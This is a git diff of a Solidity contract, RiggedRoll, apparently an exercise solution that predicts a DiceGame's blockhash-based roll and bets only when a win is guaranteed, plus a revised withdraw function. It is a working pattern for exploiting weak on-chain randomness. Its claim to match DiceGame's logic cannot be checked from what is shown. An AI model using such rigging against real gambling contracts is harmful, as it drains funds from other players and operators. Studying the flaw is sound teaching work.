@@ -15,25 +15,25 @@ contract RiggedRoll is Ownable {
 
 
     // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
-    function withdraw() external onlyOwner {
-        uint256 contractBalance = address(this).balance;
-        require(contractBalance > 0, "No funds to withdraw");
-        payable(owner()).transfer(contractBalance);
+    function withdraw(address recipient, uint256 amount) external onlyOwner {
+        require(address(this).balance >= amount, "Insufficient funds");
+        require(recipient != address(0), "Invalid recipient address");
+        // Transfer the specified amount to the recipient
+        payable(recipient).transfer(amount);
     }
 
     // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     function riggedRoll() public {
-        // Ensure the contract has enough ETH to send with the rollTheDice call
-        require(address(this).balance >= 0.002 ether, "Not enough ETH in the contract");
+        require(address(this).balance >= 0.002 ether, "Not enough ETH to roll");
 
-        // Calculate the next "random" roll based on the same method in DiceGame
+        // Predict the roll using the same logic as DiceGame
         uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 predictedRoll = blockValue % 16 + 1;
+        uint256 predictedRoll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, address(this)))) % 16 + 1;
 
         console.log("Predicted roll: %s", predictedRoll);
 
-        // Only proceed if the predicted roll is a winning number (e.g., 1-2-3)
         if (predictedRoll <= 3) {
+            // Only roll if we predict a win
             diceGame.rollTheDice{value: 0.002 ether}();
         } else {
             console.log("Not a winning roll, skipping...");
